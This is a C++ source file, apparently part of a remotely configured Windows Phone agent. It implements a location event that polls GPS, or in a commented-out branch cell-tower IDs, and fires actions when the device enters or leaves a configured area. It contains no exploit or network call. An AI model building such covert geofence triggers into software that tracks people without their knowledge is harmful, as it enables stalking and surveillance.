#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"
#include "Observer.h"
#include "Device.h"
#include "GPS.h"
///#include "Ril.h"
///#include "Cell.h"

#include "FunctionFunc.h"

// MANAGEMENT - Le coordinate vanno inserite in gradi decimali!!
DWORD WINAPI OnLocation(LPVOID lpParam) {
	Event *me = (Event *)lpParam;
	Configuration *conf;
	HANDLE eventHandle;
	int delay, iterations, curIterations = 0, curDelay = 0;
	wstring type;
	BOOL bLocation = FALSE;

	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		type = conf->getString(L"type");
	} catch (...) {
		type = L"";
	}

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		delay = INFINITE;
	}

	if (type.empty()) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}

	if (type.compare(L"gps") == 0) {
		double latOrigin, lonOrigin, latActual, lonActual, distance, curDistance;
		GPS *gpsObj = NULL;
		GPS_POSITION_WP8 gps;

		try {
			latOrigin = conf->getDouble(L"latitude");
		} catch (...) {
			latOrigin = 0.0f;
		}

		try {
			lonOrigin = conf->getDouble(L"longitude");
		} catch (...) {
			lonOrigin = 0.0f;
		}

		try {
			distance = conf->getDouble(L"distance");
		} catch (...) {
			distance = 1000.0f;
		}

		// E' singleton e non va distrutta
		gpsObj = GPS::self(30000, 1000);

		if (gpsObj == NULL) {
			me->setStatus(EVENT_STOPPED);
			return 0;
		}

		if (gpsObj->Start() == FALSE) {
			me->setStatus(EVENT_STOPPED);
			return 0;
		}

		latActual = 0.0f;
		lonActual = 0.0f;

		DBG_TRACE(L"Debug - Position.cpp - OnLocation event started\n", 5, FALSE);

		LOOP {
			if (gpsObj->getGPS(&gps)) {
				// Scriviamo il tipo di struttura e poi i dati
				DWORD dwFields = GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;

				// Ok abbiamo una posizione valida, diamoci dentro con la geometria sferica
				if ((gps.dwValidFields & dwFields) == dwFields  && gps.FixType == GPS_FIX_3D) {

					curDistance = gpsObj->VincentFormula(latOrigin, lonOrigin, gps.dblLatitude, gps.dblLongitude);

					// Se la distance e' esattamente 0.0f allora la funzione non e' riuscita a
					// convergere, percio' non abbiamo una stima attendibile
					if (curDistance != 0.0f) {
						if (curDistance <= distance) {
							if (bLocation == FALSE) {
								DBG_TRACE(L"Debug - Position.cpp - OnLocation event [IN action triggered]\n", 5, FALSE);
								me->triggerStart(); // In position
								bLocation = TRUE;
							}
						} else {
							if (bLocation == TRUE) {
								DBG_TRACE(L"Debug - Position.cpp - OnLocation event [OUT action triggered]\n", 5, FALSE);
								me->triggerEnd(); // Out of position
								bLocation = FALSE;
							}
						}
					}
				}
			}

			if (bLocation)
				curDelay = delay;
			else
				curDelay = 30000;

			_WaitForSingleObject(eventHandle, curDelay);

			if (me->shouldStop()) {
				gpsObj->Stop();
				DBG_TRACE(L"Debug - Position.cpp - Location Event is Closing\n", 1, FALSE);
				me->setStatus(EVENT_STOPPED);

				return 0;
			}

			if (bLocation && curIterations < iterations) {
				me->triggerRepeat();
				curIterations++;
			}
		}
	} else {
/***
		Cell *cellObj = NULL;
		RILCELLTOWERINFO rilCell;
		DWORD dwMCC, dwMNC;
		int country, network, area, id;
		Device *deviceObj = Device::self();

		// E' singleton e non va distrutta
		cellObj = Cell::self(30000);

		if (cellObj == NULL) {
			me->setStatus(EVENT_STOPPED);
			return 0;
		}

		if (cellObj->Start() == FALSE) {
			me->setStatus(EVENT_STOPPED);
			return 0;
		}

		deviceObj->RefreshData();

		// Prendiamo il MCC ed il MNC
		dwMCC = deviceObj->GetMobileCountryCode();
		dwMNC = deviceObj->GetMobileNetworkCode();

		try {
			country = conf->getInt(L"country");
		} catch (...) {
			country = -1;
		}

		try {
			network = conf->getInt(L"network");
		} catch (...) {
			network = -1;
		}

		try {
			area = conf->getInt(L"area");
		} catch (...) {
			area = -1;
		}

		try {
			id = conf->getInt(L"id");
		} catch (...) {
			id = -1;
		}

		LOOP {
			if (cellObj->getCELL(&rilCell)) {
				// Scriviamo il tipo di struttura e poi i dati
				DWORD dwFields =  RIL_PARAM_CTI_LOCATIONAREACODE | RIL_PARAM_CTI_CELLID;

				// Se non abbiamo MCC e MNC, usiamo quelli che abbiamo derivato dall'IMSI
				if (rilCell.dwMobileCountryCode == 0)
					rilCell.dwMobileCountryCode = dwMCC;

				if (rilCell.dwMobileNetworkCode == 0)
					rilCell.dwMobileNetworkCode = dwMNC;

				if ((rilCell.dwParams & dwFields) == dwFields) {
					if (((rilCell.dwMobileCountryCode == country || country == -1) && 
						(rilCell.dwMobileNetworkCode == network || network == -1) &&
						(rilCell.dwLocationAreaCode == area || area == -1) && 
						(rilCell.dwCellID == id || id == -1)) && bLocation == FALSE) {
							bLocation = TRUE;

							DBG_TRACE(L"Debug - Position.cpp - OnCellId event [IN action triggered]\n", 5, FALSE);
							me->triggerStart();
					}

					if (((country != -1 && rilCell.dwMobileCountryCode != country) || 
						(network != -1 && rilCell.dwMobileNetworkCode != network) ||
						(area != -1 && rilCell.dwLocationAreaCode != area) || 
						(id != -1 && rilCell.dwCellID != id)) && bLocation == TRUE) {
							bLocation = FALSE;

							DBG_TRACE(L"Debug - Position.cpp - OnCellId event [OUT action triggered]\n", 5, FALSE);
							me->triggerEnd();
					}
				}
			}

			if (bLocation)
				curDelay = delay;
			else
				curDelay = 30000;

			_WaitForSingleObject(eventHandle, curDelay);

			if (me->shouldStop()) {
				cellObj->Stop();
				DBG_TRACE(L"Debug - Position.cpp - Location Event is Closing\n", 1, FALSE);
				me->setStatus(EVENT_STOPPED);

				return 0;
			}

			if (bLocation && curIterations < iterations) {
				me->triggerRepeat();
				curIterations++;
			}
		}
***/
	}

	me->setStatus(EVENT_STOPPED);
	return 0;
}